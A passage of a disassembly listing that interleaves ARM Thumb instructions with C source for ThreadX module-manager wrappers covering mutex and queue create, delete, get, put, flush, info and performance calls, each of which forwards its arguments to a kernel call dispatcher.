 8020a72:	4b08      	ldr	r3, [pc, #32]	; (8020a94 <_txe_mutex_create+0x38>)
 8020a74:	f859 3003 	ldr.w	r3, [r9, r3]
 8020a78:	681c      	ldr	r4, [r3, #0]
 8020a7a:	68f9      	ldr	r1, [r7, #12]
 8020a7c:	68ba      	ldr	r2, [r7, #8]
 8020a7e:	f107 0314 	add.w	r3, r7, #20
 8020a82:	201a      	movs	r0, #26
 8020a84:	47a0      	blx	r4
 8020a86:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020a88:	69fb      	ldr	r3, [r7, #28]
}
 8020a8a:	4618      	mov	r0, r3
 8020a8c:	3724      	adds	r7, #36	; 0x24
 8020a8e:	46bd      	mov	sp, r7
 8020a90:	bd90      	pop	{r4, r7, pc}
 8020a92:	bf00      	nop
 8020a94:	00000004 	.word	0x00000004

08020a98 <_txe_mutex_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_delete(TX_MUTEX *mutex_ptr)
{
 8020a98:	b590      	push	{r4, r7, lr}
 8020a9a:	b085      	sub	sp, #20
 8020a9c:	af00      	add	r7, sp, #0
 8020a9e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_DELETE_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020aa0:	4b07      	ldr	r3, [pc, #28]	; (8020ac0 <_txe_mutex_delete+0x28>)
 8020aa2:	f859 3003 	ldr.w	r3, [r9, r3]
 8020aa6:	681c      	ldr	r4, [r3, #0]
 8020aa8:	6879      	ldr	r1, [r7, #4]
 8020aaa:	2300      	movs	r3, #0
 8020aac:	2200      	movs	r2, #0
 8020aae:	201b      	movs	r0, #27
 8020ab0:	47a0      	blx	r4
 8020ab2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ab4:	68fb      	ldr	r3, [r7, #12]
}
 8020ab6:	4618      	mov	r0, r3
 8020ab8:	3714      	adds	r7, #20
 8020aba:	46bd      	mov	sp, r7
 8020abc:	bd90      	pop	{r4, r7, pc}
 8020abe:	bf00      	nop
 8020ac0:	00000004 	.word	0x00000004

08020ac4 <_txe_mutex_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_get(TX_MUTEX *mutex_ptr, ULONG wait_option)
{
 8020ac4:	b590      	push	{r4, r7, lr}
 8020ac6:	b085      	sub	sp, #20
 8020ac8:	af00      	add	r7, sp, #0
 8020aca:	6078      	str	r0, [r7, #4]
 8020acc:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) wait_option, 0);
 8020ace:	4b07      	ldr	r3, [pc, #28]	; (8020aec <_txe_mutex_get+0x28>)
 8020ad0:	f859 3003 	ldr.w	r3, [r9, r3]
 8020ad4:	681c      	ldr	r4, [r3, #0]
 8020ad6:	6879      	ldr	r1, [r7, #4]
 8020ad8:	2300      	movs	r3, #0
 8020ada:	683a      	ldr	r2, [r7, #0]
 8020adc:	201c      	movs	r0, #28
 8020ade:	47a0      	blx	r4
 8020ae0:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ae2:	68fb      	ldr	r3, [r7, #12]
}
 8020ae4:	4618      	mov	r0, r3
 8020ae6:	3714      	adds	r7, #20
 8020ae8:	46bd      	mov	sp, r7
 8020aea:	bd90      	pop	{r4, r7, pc}
 8020aec:	00000004 	.word	0x00000004

08020af0 <_txe_mutex_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_info_get(TX_MUTEX *mutex_ptr, CHAR **name, ULONG *count, TX_THREAD **owner, TX_THREAD **first_suspended, ULONG *suspended_count, TX_MUTEX **next_mutex)
{
 8020af0:	b590      	push	{r4, r7, lr}
 8020af2:	b08b      	sub	sp, #44	; 0x2c
 8020af4:	af00      	add	r7, sp, #0
 8020af6:	60f8      	str	r0, [r7, #12]
 8020af8:	60b9      	str	r1, [r7, #8]
 8020afa:	607a      	str	r2, [r7, #4]
 8020afc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) count;
 8020afe:	687b      	ldr	r3, [r7, #4]
 8020b00:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) owner;
 8020b02:	683b      	ldr	r3, [r7, #0]
 8020b04:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020b06:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020b08:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020b0a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020b0c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_mutex;
 8020b0e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020b10:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_INFO_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020b12:	4b08      	ldr	r3, [pc, #32]	; (8020b34 <_txe_mutex_info_get+0x44>)
 8020b14:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b18:	681c      	ldr	r4, [r3, #0]
 8020b1a:	68f9      	ldr	r1, [r7, #12]
 8020b1c:	68ba      	ldr	r2, [r7, #8]
 8020b1e:	f107 0310 	add.w	r3, r7, #16
 8020b22:	201d      	movs	r0, #29
 8020b24:	47a0      	blx	r4
 8020b26:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020b28:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020b2a:	4618      	mov	r0, r3
 8020b2c:	372c      	adds	r7, #44	; 0x2c
 8020b2e:	46bd      	mov	sp, r7
 8020b30:	bd90      	pop	{r4, r7, pc}
 8020b32:	bf00      	nop
 8020b34:	00000004 	.word	0x00000004

08020b38 <_tx_mutex_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_mutex_performance_info_get(TX_MUTEX *mutex_ptr, ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts, ULONG *inversions, ULONG *inheritances)
{
 8020b38:	b590      	push	{r4, r7, lr}
 8020b3a:	b08b      	sub	sp, #44	; 0x2c
 8020b3c:	af00      	add	r7, sp, #0
 8020b3e:	60f8      	str	r0, [r7, #12]
 8020b40:	60b9      	str	r1, [r7, #8]
 8020b42:	607a      	str	r2, [r7, #4]
 8020b44:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 8020b46:	687b      	ldr	r3, [r7, #4]
 8020b48:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 8020b4a:	683b      	ldr	r3, [r7, #0]
 8020b4c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 8020b4e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020b50:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) inversions;
 8020b52:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020b54:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) inheritances;
 8020b56:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020b58:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) puts, (ALIGN_TYPE) extra_parameters);
 8020b5a:	4b08      	ldr	r3, [pc, #32]	; (8020b7c <_tx_mutex_performance_info_get+0x44>)
 8020b5c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b60:	681c      	ldr	r4, [r3, #0]
 8020b62:	68f9      	ldr	r1, [r7, #12]
 8020b64:	68ba      	ldr	r2, [r7, #8]
 8020b66:	f107 0310 	add.w	r3, r7, #16
 8020b6a:	201e      	movs	r0, #30
 8020b6c:	47a0      	blx	r4
 8020b6e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020b70:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020b72:	4618      	mov	r0, r3
 8020b74:	372c      	adds	r7, #44	; 0x2c
 8020b76:	46bd      	mov	sp, r7
 8020b78:	bd90      	pop	{r4, r7, pc}
 8020b7a:	bf00      	nop
 8020b7c:	00000004 	.word	0x00000004

08020b80 <_tx_mutex_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_mutex_performance_system_info_get(ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts, ULONG *inversions, ULONG *inheritances)
{
 8020b80:	b590      	push	{r4, r7, lr}
 8020b82:	b08b      	sub	sp, #44	; 0x2c
 8020b84:	af00      	add	r7, sp, #0
 8020b86:	60f8      	str	r0, [r7, #12]
 8020b88:	60b9      	str	r1, [r7, #8]
 8020b8a:	607a      	str	r2, [r7, #4]
 8020b8c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 8020b8e:	687b      	ldr	r3, [r7, #4]
 8020b90:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 8020b92:	683b      	ldr	r3, [r7, #0]
 8020b94:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) inversions;
 8020b96:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020b98:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) inheritances;
 8020b9a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020b9c:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) puts, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 8020b9e:	4b08      	ldr	r3, [pc, #32]	; (8020bc0 <_tx_mutex_performance_system_info_get+0x40>)
 8020ba0:	f859 3003 	ldr.w	r3, [r9, r3]
 8020ba4:	681c      	ldr	r4, [r3, #0]
 8020ba6:	68f9      	ldr	r1, [r7, #12]
 8020ba8:	68ba      	ldr	r2, [r7, #8]
 8020baa:	f107 0314 	add.w	r3, r7, #20
 8020bae:	201f      	movs	r0, #31
 8020bb0:	47a0      	blx	r4
 8020bb2:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020bb4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020bb6:	4618      	mov	r0, r3
 8020bb8:	372c      	adds	r7, #44	; 0x2c
 8020bba:	46bd      	mov	sp, r7
 8020bbc:	bd90      	pop	{r4, r7, pc}
 8020bbe:	bf00      	nop
 8020bc0:	00000004 	.word	0x00000004

08020bc4 <_txe_mutex_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_prioritize(TX_MUTEX *mutex_ptr)
{
 8020bc4:	b590      	push	{r4, r7, lr}
 8020bc6:	b085      	sub	sp, #20
 8020bc8:	af00      	add	r7, sp, #0
 8020bca:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PRIORITIZE_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020bcc:	4b07      	ldr	r3, [pc, #28]	; (8020bec <_txe_mutex_prioritize+0x28>)
 8020bce:	f859 3003 	ldr.w	r3, [r9, r3]
 8020bd2:	681c      	ldr	r4, [r3, #0]
 8020bd4:	6879      	ldr	r1, [r7, #4]
 8020bd6:	2300      	movs	r3, #0
 8020bd8:	2200      	movs	r2, #0
 8020bda:	2020      	movs	r0, #32
 8020bdc:	47a0      	blx	r4
 8020bde:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020be0:	68fb      	ldr	r3, [r7, #12]
}
 8020be2:	4618      	mov	r0, r3
 8020be4:	3714      	adds	r7, #20
 8020be6:	46bd      	mov	sp, r7
 8020be8:	bd90      	pop	{r4, r7, pc}
 8020bea:	bf00      	nop
 8020bec:	00000004 	.word	0x00000004

08020bf0 <_txe_mutex_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_put(TX_MUTEX *mutex_ptr)
{
 8020bf0:	b590      	push	{r4, r7, lr}
 8020bf2:	b085      	sub	sp, #20
 8020bf4:	af00      	add	r7, sp, #0
 8020bf6:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PUT_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020bf8:	4b07      	ldr	r3, [pc, #28]	; (8020c18 <_txe_mutex_put+0x28>)
 8020bfa:	f859 3003 	ldr.w	r3, [r9, r3]
 8020bfe:	681c      	ldr	r4, [r3, #0]
 8020c00:	6879      	ldr	r1, [r7, #4]
 8020c02:	2300      	movs	r3, #0
 8020c04:	2200      	movs	r2, #0
 8020c06:	2021      	movs	r0, #33	; 0x21
 8020c08:	47a0      	blx	r4
 8020c0a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020c0c:	68fb      	ldr	r3, [r7, #12]
}
 8020c0e:	4618      	mov	r0, r3
 8020c10:	3714      	adds	r7, #20
 8020c12:	46bd      	mov	sp, r7
 8020c14:	bd90      	pop	{r4, r7, pc}
 8020c16:	bf00      	nop
 8020c18:	00000004 	.word	0x00000004

08020c1c <_txe_queue_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_create(TX_QUEUE *queue_ptr, CHAR *name_ptr, UINT message_size, VOID *queue_start, ULONG queue_size, UINT queue_control_block_size)
{
 8020c1c:	b590      	push	{r4, r7, lr}
 8020c1e:	b08b      	sub	sp, #44	; 0x2c
 8020c20:	af00      	add	r7, sp, #0
 8020c22:	60f8      	str	r0, [r7, #12]
 8020c24:	60b9      	str	r1, [r7, #8]
 8020c26:	607a      	str	r2, [r7, #4]
 8020c28:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) message_size;
 8020c2a:	687b      	ldr	r3, [r7, #4]
 8020c2c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) queue_start;
 8020c2e:	683b      	ldr	r3, [r7, #0]
 8020c30:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) queue_size;
 8020c32:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020c34:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) queue_control_block_size;
 8020c36:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020c38:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_CREATE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020c3a:	4b08      	ldr	r3, [pc, #32]	; (8020c5c <_txe_queue_create+0x40>)
 8020c3c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c40:	681c      	ldr	r4, [r3, #0]
 8020c42:	68f9      	ldr	r1, [r7, #12]
 8020c44:	68ba      	ldr	r2, [r7, #8]
 8020c46:	f107 0314 	add.w	r3, r7, #20
 8020c4a:	2022      	movs	r0, #34	; 0x22
 8020c4c:	47a0      	blx	r4
 8020c4e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020c50:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020c52:	4618      	mov	r0, r3
 8020c54:	372c      	adds	r7, #44	; 0x2c
 8020c56:	46bd      	mov	sp, r7
 8020c58:	bd90      	pop	{r4, r7, pc}
 8020c5a:	bf00      	nop
 8020c5c:	00000004 	.word	0x00000004

08020c60 <_txe_queue_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_delete(TX_QUEUE *queue_ptr)
{
 8020c60:	b590      	push	{r4, r7, lr}
 8020c62:	b085      	sub	sp, #20
 8020c64:	af00      	add	r7, sp, #0
 8020c66:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_DELETE_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020c68:	4b07      	ldr	r3, [pc, #28]	; (8020c88 <_txe_queue_delete+0x28>)
 8020c6a:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c6e:	681c      	ldr	r4, [r3, #0]
 8020c70:	6879      	ldr	r1, [r7, #4]
 8020c72:	2300      	movs	r3, #0
 8020c74:	2200      	movs	r2, #0
 8020c76:	2023      	movs	r0, #35	; 0x23
 8020c78:	47a0      	blx	r4
 8020c7a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020c7c:	68fb      	ldr	r3, [r7, #12]
}
 8020c7e:	4618      	mov	r0, r3
 8020c80:	3714      	adds	r7, #20
 8020c82:	46bd      	mov	sp, r7
 8020c84:	bd90      	pop	{r4, r7, pc}
 8020c86:	bf00      	nop
 8020c88:	00000004 	.word	0x00000004

08020c8c <_txe_queue_flush>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_flush(TX_QUEUE *queue_ptr)
{
 8020c8c:	b590      	push	{r4, r7, lr}
 8020c8e:	b085      	sub	sp, #20
 8020c90:	af00      	add	r7, sp, #0
 8020c92:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_FLUSH_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020c94:	4b07      	ldr	r3, [pc, #28]	; (8020cb4 <_txe_queue_flush+0x28>)
 8020c96:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c9a:	681c      	ldr	r4, [r3, #0]
 8020c9c:	6879      	ldr	r1, [r7, #4]
 8020c9e:	2300      	movs	r3, #0
 8020ca0:	2200      	movs	r2, #0
 8020ca2:	2024      	movs	r0, #36	; 0x24
 8020ca4:	47a0      	blx	r4
 8020ca6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ca8:	68fb      	ldr	r3, [r7, #12]
}
 8020caa:	4618      	mov	r0, r3
 8020cac:	3714      	adds	r7, #20
 8020cae:	46bd      	mov	sp, r7
 8020cb0:	bd90      	pop	{r4, r7, pc}
 8020cb2:	bf00      	nop
 8020cb4:	00000004 	.word	0x00000004

08020cb8 <_txe_queue_front_send>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_front_send(TX_QUEUE *queue_ptr, VOID *source_ptr, ULONG wait_option)
{
 8020cb8:	b590      	push	{r4, r7, lr}
 8020cba:	b087      	sub	sp, #28
 8020cbc:	af00      	add	r7, sp, #0
 8020cbe:	60f8      	str	r0, [r7, #12]
 8020cc0:	60b9      	str	r1, [r7, #8]
 8020cc2:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_FRONT_SEND_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) source_ptr, (ALIGN_TYPE) wait_option);
 8020cc4:	4b07      	ldr	r3, [pc, #28]	; (8020ce4 <_txe_queue_front_send+0x2c>)
 8020cc6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020cca:	681c      	ldr	r4, [r3, #0]
 8020ccc:	68f9      	ldr	r1, [r7, #12]
 8020cce:	68ba      	ldr	r2, [r7, #8]
 8020cd0:	687b      	ldr	r3, [r7, #4]
 8020cd2:	2025      	movs	r0, #37	; 0x25
 8020cd4:	47a0      	blx	r4
 8020cd6:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020cd8:	697b      	ldr	r3, [r7, #20]
}
 8020cda:	4618      	mov	r0, r3
 8020cdc:	371c      	adds	r7, #28
 8020cde:	46bd      	mov	sp, r7
 8020ce0:	bd90      	pop	{r4, r7, pc}
 8020ce2:	bf00      	nop
 8020ce4:	00000004 	.word	0x00000004

08020ce8 <_txe_queue_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_info_get(TX_QUEUE *queue_ptr, CHAR **name, ULONG *enqueued, ULONG *available_storage, TX_THREAD **first_suspended, ULONG *suspended_count, TX_QUEUE **next_queue)
{
 8020ce8:	b590      	push	{r4, r7, lr}
 8020cea:	b08b      	sub	sp, #44	; 0x2c
 8020cec:	af00      	add	r7, sp, #0
 8020cee:	60f8      	str	r0, [r7, #12]
 8020cf0:	60b9      	str	r1, [r7, #8]
 8020cf2:	607a      	str	r2, [r7, #4]
 8020cf4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) enqueued;
 8020cf6:	687b      	ldr	r3, [r7, #4]
 8020cf8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) available_storage;
 8020cfa:	683b      	ldr	r3, [r7, #0]
 8020cfc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020cfe:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020d00:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020d02:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020d04:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_queue;
 8020d06:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020d08:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_INFO_GET_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020d0a:	4b08      	ldr	r3, [pc, #32]	; (8020d2c <_txe_queue_info_get+0x44>)
 8020d0c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d10:	681c      	ldr	r4, [r3, #0]
 8020d12:	68f9      	ldr	r1, [r7, #12]
 8020d14:	68ba      	ldr	r2, [r7, #8]
 8020d16:	f107 0310 	add.w	r3, r7, #16
 8020d1a:	2026      	movs	r0, #38	; 0x26
 8020d1c:	47a0      	blx	r4
 8020d1e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020d20:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020d22:	4618      	mov	r0, r3
 8020d24:	372c      	adds	r7, #44	; 0x2c
 8020d26:	46bd      	mov	sp, r7
 8020d28:	bd90      	pop	{r4, r7, pc}
 8020d2a:	bf00      	nop
 8020d2c:	00000004 	.word	0x00000004

08020d30 <_tx_queue_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_queue_performance_info_get(TX_QUEUE *queue_ptr, ULONG *messages_sent, ULONG *messages_received, ULONG *empty_suspensions, ULONG *full_suspensions, ULONG *full_errors, ULONG *timeouts)
{
 8020d30:	b590      	push	{r4, r7, lr}
 8020d32:	b08b      	sub	sp, #44	; 0x2c
 8020d34:	af00      	add	r7, sp, #0
 8020d36:	60f8      	str	r0, [r7, #12]
 8020d38:	60b9      	str	r1, [r7, #8]
 8020d3a:	607a      	str	r2, [r7, #4]
 8020d3c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) messages_received;
 8020d3e:	687b      	ldr	r3, [r7, #4]
 8020d40:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) empty_suspensions;
 8020d42:	683b      	ldr	r3, [r7, #0]
 8020d44:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) full_suspensions;
 8020d46:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020d48:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) full_errors;
 8020d4a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020d4c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) timeouts;
 8020d4e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020d50:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) messages_sent, (ALIGN_TYPE) extra_parameters);
 8020d52:	4b08      	ldr	r3, [pc, #32]	; (8020d74 <_tx_queue_performance_info_get+0x44>)
 8020d54:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d58:	681c      	ldr	r4, [r3, #0]
 8020d5a:	68f9      	ldr	r1, [r7, #12]
 8020d5c:	68ba      	ldr	r2, [r7, #8]
 8020d5e:	f107 0310 	add.w	r3, r7, #16
 8020d62:	2027      	movs	r0, #39	; 0x27
 8020d64:	47a0      	blx	r4
 8020d66:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020d68:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020d6a:	4618      	mov	r0, r3
 8020d6c:	372c      	adds	r7, #44	; 0x2c
 8020d6e:	46bd      	mov	sp, r7
 8020d70:	bd90      	pop	{r4, r7, pc}
 8020d72:	bf00      	nop
 8020d74:	00000004 	.word	0x00000004

08020d78 <_tx_queue_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_queue_performance_system_info_get(ULONG *messages_sent, ULONG *messages_received, ULONG *empty_suspensions, ULONG *full_suspensions, ULONG *full_errors, ULONG *timeouts)
{
 8020d78:	b590      	push	{r4, r7, lr}
 8020d7a:	b08b      	sub	sp, #44	; 0x2c
 8020d7c:	af00      	add	r7, sp, #0
 8020d7e:	60f8      	str	r0, [r7, #12]
 8020d80:	60b9      	str	r1, [r7, #8]
 8020d82:	607a      	str	r2, [r7, #4]
 8020d84:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) empty_suspensions;
 8020d86:	687b      	ldr	r3, [r7, #4]
 8020d88:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) full_suspensions;
 8020d8a:	683b      	ldr	r3, [r7, #0]
 8020d8c:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) full_errors;
 8020d8e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020d90:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) timeouts;
 8020d92:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020d94:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) messages_sent, (ALIGN_TYPE) messages_received, (ALIGN_TYPE) extra_parameters);
 8020d96:	4b08      	ldr	r3, [pc, #32]	; (8020db8 <_tx_queue_performance_system_info_get+0x40>)
 8020d98:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d9c:	681c      	ldr	r4, [r3, #0]
 8020d9e:	68f9      	ldr	r1, [r7, #12]
 8020da0:	68ba      	ldr	r2, [r7, #8]
 8020da2:	f107 0314 	add.w	r3, r7, #20
 8020da6:	2028      	movs	r0, #40	; 0x28
 8020da8:	47a0      	blx	r4
 8020daa:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
